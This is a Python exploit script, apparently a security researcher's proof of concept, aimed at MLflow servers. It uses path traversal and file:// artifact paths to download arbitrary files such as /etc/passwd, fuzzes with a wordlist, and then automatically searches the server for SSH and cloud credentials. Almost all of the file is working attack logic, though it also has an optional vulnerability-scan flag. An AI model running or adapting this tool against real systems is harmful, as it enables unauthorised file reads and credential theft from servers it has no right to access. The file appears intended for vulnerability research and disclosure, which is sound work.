import os
import uuid
import argparse
from libs.APICalls import APICalls
from libs.SecretsFinder import SecretsFinder


def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file',
                        help='LFI fuzzing list, e.g., /path/to/LFI.txt',
                        default=f'{os.getcwd()}/utils/LFI.txt',
                        required=False)
    parser.add_argument('-s', '--server',
                        help='Specific MLflow protocol, server and port, e.g., http://1.2.3.4:5000',
                        default="http://127.0.0.1:5000",
                        required=True)
    parser.add_argument('-i', '--identifier',
                        help='Identifier for the model',
                        default=f'protectai-{uuid.uuid4()}',
                        required=False)
    parser.add_argument('-t', '--target-file',
                        help='Specific file you wish to download, e.g., "/etc/passwd"',
                        required=False)
    parser.add_argument('--scan',
                        help='Scan server for vulnerability',
                        action='store_true')
    parser.add_argument('--remote-artifact-store',
                        help='The remote artifact store server, e.g., "http://1.2.3.4:5000/artifacts/"',
                        required=False)
    args = parser.parse_args()
    return args

def get_target_files(args):
    target_files = []
    if args.target_file:
        if args.remote_artifact_store:
            target_file = f'{args.remote_artifact_store}../../../../../../../..{args.target_file}'
        else:
            target_file = f'file://.{args.target_file}'
        target_files.append(target_file)

    elif args.file:
        with open(args.file, 'r') as f:
            targets = f.readlines()
            for target in targets:
                if args.remote_artifact_store:
                    target_files.append(f'{args.remote_artifact_store}../../../../../../../..{target.strip()}')
                else:
                    target_files.append(f'file://.{target.strip()}')
    else:
        print("[-] Error: No targets specified")
        exit(1)
    return target_files

def get_files_found(ac: APICalls, target_files: list):
    files_found = {}
    for target_file in target_files:
        file_found = ac.run(target_file)
        files_found.update(file_found)
    return files_found

def get_ssh_cloud_creds(ac: APICalls, files_found: dict):
    if '/etc/passwd' in files_found and not args.target_file:
        print(f'[*] Parsing /etc/passwd for users')
        passwd = files_found['/etc/passwd']
        sf = SecretsFinder(ac, passwd)
        secrets = sf.run()
        return secrets

def main(args):
    server = args.server
    identifier = args.identifier
    target_files = get_target_files(args)
    not_found = "[-] No files found; try another wordlist with -f <path/to/wordlist> or a different specific file with"\
                " -t <path/to/file>"
    ac = APICalls(server, identifier)

    # Scan server for vulnerability is --scan flag is set
    if args.scan:
        ac.vuln_scan = True
        ac.vulnerability_scan()

    # Get files from server via --target-file or --file
    files_found = get_files_found(ac, target_files) # files_found = {"/etc/passwd": </etc/passwd contents>, ...}
    if len(files_found) == 0:
        print(not_found)

    # Automatically hunt SSH and cloud credentials if /etc/passwd is found
    if '/etc/passwd' in files_found and not args.target_file:
        secrets = get_ssh_cloud_creds(ac, files_found)
        if len(secrets) == 0:
            print(not_found)


if __name__ == '__main__':
    args = args()
    main(args)

